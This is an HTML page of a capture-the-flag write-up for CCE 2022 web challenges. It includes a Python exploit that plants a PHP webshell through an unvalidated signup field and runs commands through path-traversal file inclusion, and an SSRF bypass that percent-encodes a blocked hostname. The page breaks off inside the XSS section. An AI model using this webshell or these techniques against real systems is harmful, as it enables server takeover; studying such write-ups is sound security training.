@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>CCE 2022 Write Up :: My New Hugo Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This article is about write-up for the CCE 2022. there is only three web challenges, all of which contain RCE, XSS, SSRF. Actually someone ask to me paly it but i couldn&#39;t join with him." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://example.org/posts/2022-09-25-cce/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://example.org/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://example.org/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="https://example.org/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="CCE 2022 Write Up">
+<meta property="og:description" content="This article is about write-up for the CCE 2022. there is only three web challenges, all of which contain RCE, XSS, SSRF. Actually someone ask to me paly it but i couldn&#39;t join with him." />
+<meta property="og:url" content="https://example.org/posts/2022-09-25-cce/" />
+<meta property="og:site_name" content="My New Hugo Site" />
+
+  
+    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2022-09-25 04:00:53 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://example.org/">
+  <div class="logo">
+    re-Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://example.org/posts/2022-09-25-cce/">CCE 2022 Write Up</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2022-09-25</time>
+    
+</div>
+
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p>After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.</p>
+<p>But I was able to find 5 XSS from ** by concentrating on my work. And maybe if i was with him, it would have been the first and last CCE general finals of my life XD</p>
+<hr>
+<h1 id="reborn-of-php">reborn of php<a href="#reborn-of-php" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The reborn of php is challenge that triggers RCE via file upload. And the flag location is /flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;__MAIN__&#39;</span>)) <span style="color:#66d9ef">exit</span>; <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    class Controller {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        private $board = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        private $action = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function __construct($board, $action) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $this-&gt;board = $board;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $this-&gt;action = $action;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if(!preg_match(&#39;/^[a-z0-9:.]+$/i&#39;, $this-&gt;board)){
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $this-&gt;board = &#39;main&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $this-&gt;action = &#39;index&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">           }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">       
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function process() {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $path = &#34;{$this-&gt;board}/{$this-&gt;action}&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if(preg_match(&#39;/php|html/i&#39;,  $path)){
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                alert(&#39;not invalid&#39;, &#39;back&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }           
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            chdir(&#39;pages/&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if(!file_exists(&#34;{$path}.php&#34;)) $path = &#39;main/index&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            include(&#34;{$path}.php&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">       }     
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    // /var/www/html/lib/controller.lib.php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;__MAIN__&#39;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;lib/controller.lib.php&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;lib/util.lib.php&#39;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    $board <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;b&#39;</span>] <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;b&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;main&#39;</span> ;
+</span></span><span style="display:flex;"><span>    $action <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;a&#39;</span>] <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;a&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;index&#39;</span>;
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>    $controller <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Controller</span>($board, $action);
+</span></span><span style="display:flex;"><span>    $controller<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">process</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// /var/www/html/index.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>This is code of index.php and controller.lib.php. In the index.php, It takes parameters and passes them to the Controller constructor. An LFI vulnerability exists in the process() method of Controller. If we can create arbitrary php files on the server we can trigger RCE.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save_user_id</span>($id, $pw){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#39;../&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;dbs/</span><span style="color:#e6db74">{</span>$id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">serialize</span>($pw));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// /var/www/html/lib/util.lib.php
+</span></span></span></code></pre></div><p>A vulnerability exists in the save_user_id() function that can create arbitrary files. Also, this function is fired when registering as a member. And the file creation path is under /var/www/html/dbs/</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;__MAIN__&#39;</span>)) <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Access denied&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $id = $_POST[&#39;id&#39;];
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $pw = $_POST[&#39;pw&#39;];
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if(!$id || !$pw) alert(&#39;invalid input&#39;, &#39;back&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if(!is_valid_id($id)) alert(&#39;invalid id&#39;, &#39;back&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if(is_exists_user($id)){
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        alert(&#39;already joined&#39;, &#39;back&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    save_user_id($id, $pw);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    alert(&#39;welcome&#39;, &#39;/&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    // /var/www/html/pages/register.php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
+</span></span></span></code></pre></div><p>We can upload the PHP file because we do not validate the user id parameter in the signup logic.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHALLURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://3.37.8.189:5580&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>CONTENT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php echo system($_GET[&#39;x&#39;]);?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>string_pool <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>digits
+</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(LENGTH):
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>choice(string_pool) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FILENAME <span style="color:#f92672">=</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.php&#39;</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] FILANAME : </span><span style="color:#e6db74">{</span>FILENAME<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(CHALLURL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/?b=register&amp;a=register&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;id&#39;</span>:FILENAME, <span style="color:#e6db74">&#39;pw&#39;</span>:CONTENT})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;[+] Enter the command : &#34;</span>)
+</span></span><span style="display:flex;"><span>    RESULT <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(CHALLURL <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/?b=login&amp;a=../../dbs/</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;x=</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>    print(RESULT)
+</span></span></code></pre></div><p>I wrote the exploit code as above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>❯ python3 poc.py   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> FILANAME : 37106.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enter the command : id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s:32:<span style="color:#e6db74">&#34;uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">uid=33(www-data) gid=33(www-data) groups=33(www-data)&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enter the command : cat /flag
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s:32:<span style="color:#e6db74">&#34;cce2022{ce9237924b58afdf2a164345ddd8265e49f210abc75ab12002eb6f6a32109d293a992b99214eae312f9f33131458dbc0e8c17485364fec867a241b1b}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cce2022{ce9237924b58afdf2a164345ddd8265e49f210abc75ab12002eb6f6a32109d293a992b99214eae312f9f33131458dbc0e8c17485364fec867a241b1b}&#34;</span>;
+</span></span></code></pre></div><hr>
+<h1 id="babyweb">BabyWeb<a href="#babyweb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This is a challenge of SSRF using different URL parsing methods.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;url&#39;</span>]
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>urlparse(url)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>hostname <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;flag.service&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Not allow&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(valid_ip(result<span style="color:#f92672">.</span>hostname)):
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;huh??&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://&#34;</span><span style="color:#f92672">+</span>result<span style="color:#f92672">.</span>hostname<span style="color:#f92672">+</span>result<span style="color:#f92672">.</span>path, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Something wrong...&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> data
+</span></span></code></pre></div><p>Looking at the code, hostname should not be flag.service. And it must be a valid IP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span>version: <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  challenge:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    build:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      context: .<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      dockerfile: ./public/Dockerfile<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    ports: <span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;80:80&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    links:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      - flag.service<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  flag.service:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    build:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      context: .<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      dockerfile: ./internal/Dockerfile<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  <span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>However, since the URL of the internal server is flag.service, you need to send a request to flag.service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> FLAG
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>host <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;flag.service&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FLAG
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Nice try :)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>)
+</span></span></code></pre></div><p>We can get the flags by sending a request to <a href="http://flag.service/flag">http://flag.service/flag</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHALLURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost/&#39;</span> <span style="color:#75715e"># http://3.38.33.163/</span>
+</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>parse_hostname <span style="color:#f92672">=</span> list(<span style="color:#e6db74">&#39;flag.service&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> parse_hostname:
+</span></span><span style="display:flex;"><span>    hostname <span style="color:#f92672">+=</span> hex(ord(s))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;%&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;http://</span><span style="color:#e6db74">{</span>hostname<span style="color:#e6db74">}</span><span style="color:#e6db74">/flag&#39;</span>
+</span></span><span style="display:flex;"><span>print(url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(CHALLURL, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;url&#39;</span>:url})<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;FLAG is </span><span style="color:#e6db74">{</span>FLAG<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">http://</span><span style="color:#e6db74">%66%</span><span style="color:#e6db74">6c</span><span style="color:#e6db74">%61%</span><span style="color:#e6db74">67</span><span style="color:#e6db74">%2e%73%</span><span style="color:#e6db74">65</span><span style="color:#e6db74">%72%</span><span style="color:#e6db74">76</span><span style="color:#e6db74">%69%</span><span style="color:#e6db74">63%65/flag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FLAG is cce2022</span><span style="color:#e6db74">{this_is_not_real_flag}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span></code></pre></div><p>This can be easily solved as above. When parsing a url, the hostname is parsed in the url-encoded state, but when sending a request, the url-encoded hostname is decoded.</p>
+<hr>
+<h1 id="blue-archive---web">blue archive - web<a href="#blue-archive---web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This is a challenge for using simple XSS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">moment</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;moment&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">puppeteer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;puppeteer&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sandbox_url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://sandbox.bluearchive.kr:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/?url=`</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./config&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveArchive</span>(<span style="color:#a6e22e">url</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">SECRET</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">url</span>).<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
